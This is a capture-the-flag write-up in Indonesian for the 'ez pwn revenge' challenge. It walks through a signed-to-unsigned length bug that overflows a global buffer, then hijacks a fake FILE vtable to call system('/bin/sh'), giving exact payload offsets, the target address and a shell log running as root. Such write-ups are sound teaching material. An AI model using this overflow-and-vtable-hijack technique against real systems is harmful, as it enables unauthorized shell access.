# ez pwn revenge

**CTF:** LYKNCTF 2026  
**Category:** Pwn  
**Difficulty:** Medium  
**Target:** `15.235.202.47:8996`  
**Flag:** `LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}`

## Deskripsi

> :sob:

Program meminta panjang buffer, membaca data ke area global, lalu memanggil fungsi penutup file buatan sendiri. Bug signed-to-unsigned membuat input `-1` berubah menjadi ukuran baca `255`, cukup untuk menimpa fake `FILE` object dan function pointer-nya.

## Recon

```bash
file chall
checksec --file=chall
nm -n chall
```

Proteksi binary:

```text
Arch:       amd64
RELRO:      Full RELRO
Stack:      No canary
NX:         Enabled
PIE:        No PIE
Stripped:   No
```

Simbol yang relevan:

```text
0x401040  system@plt
0x40128d  custom_fclose
0x40130f  main
0x404040  box
```

Karena binary non-PIE, alamat `system@plt` dan buffer global selalu tetap.

## Signed Length Truncation

Potongan logika di `main`:

```c
int length;
unsigned char read_size;

scanf("%d", &length);

if (length > 80) {
    puts("So u want to overflow this challenge??");
    return 1;
}

read_size = length;
read(0, box, read_size);
```

Pengecekan hanya menolak nilai di atas `80`. Nilai negatif tetap lolos.

Input:

```text
-1
```

disimpan sebagai integer `-1`, kemudian dipotong menjadi satu byte:

```text
(int)-1 -> (unsigned char)0xff -> 255
```

Hasilnya, `read()` menerima ukuran `255` dan menulis mulai dari `box` di `0x404040`.

## Layout Global

`init_fake_file()` menyiapkan object buatan sendiri di area `box`.

```text
box + 0x00  area yang bisa dipakai sebagai fake vtable
box + 0x50  safety flag
box + 0x58  magic value
box + 0x60  awal fake FILE
box + 0xA8  fake_file + 0x48, pointer vtable
```

Setelah pembacaan, program memanggil:

```c
custom_fclose((void *)(box + 0x60));
```

## `custom_fclose`

Alur sederhananya:

```c
void custom_fclose(fake_file *fp) {
    if (fp == NULL || fp->vtable == NULL)
        return;

    if ((fp->flags & 0xffff0000) == 0xfbad0000 &&
        fp->write_base > fp->write_ptr) {
        fp->vtable->overflow(fp);
    } else {
        fp->vtable->finish(fp);
    }
}
```

Field yang dipakai:

```text
fake_file + 0x10  flags
fake_file + 0x20  write_base
fake_file + 0x28  write_ptr
fake_file + 0x48  vtable pointer
```

Jalur paling pendek adalah membuat pengecekan magic gagal. Program lalu mengambil function pointer kedua dari fake vtable:

```asm
mov rax, [fp + 0x48]
mov rdx, [rax + 0x08]
mov rdi, fp
call rdx
```

Argumen pertama callback adalah alamat fake object itu sendiri.

## Membentuk `system("/bin/sh")`

Fake object dimulai di:

```text
box + 0x60 = 0x4040a0
```

Taruh string `/bin/sh\0` pada awal object tersebut. Saat callback dipanggil:

```text
RDI = 0x4040a0 -> "/bin/sh"
```

Function pointer callback kedua diisi dengan:

```text
system@plt = 0x401040
```

Vtable palsu ditempatkan di awal `box`, lalu pointer pada `fake_file + 0x48` diarahkan ke sana.

Offset payload:

```python
payload[0x08:0x10] = p64(0x401040)  # fake_vtable->finish
payload[0x50:0x54] = p32(0)         # lolos safety branch
payload[0x60:0x68] = b"/bin/sh\x00"
payload[0x70:0x78] = p64(0)         # flags check gagal
payload[0xA8:0xB0] = p64(0x404040)  # fake_file->vtable
```

## Solver

```bash
python3 solve.py
```

Tes lokal:

```bash
python3 solve.py LOCAL
```

Setelah shell terbuka:

```bash
cat flag* 2>/dev/null || cat /flag 2>/dev/null || /readflag
```

## Validasi Lokal

Payload yang sama menghasilkan shell root:

```text
Let's me check if you are safe or not!
You doing it right. Are you?
Your overflow attempt is 999999
PWN_OK
uid=0(root) gid=0(root) groups=0(root)
bye.
```

## Flag

```text
LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
```
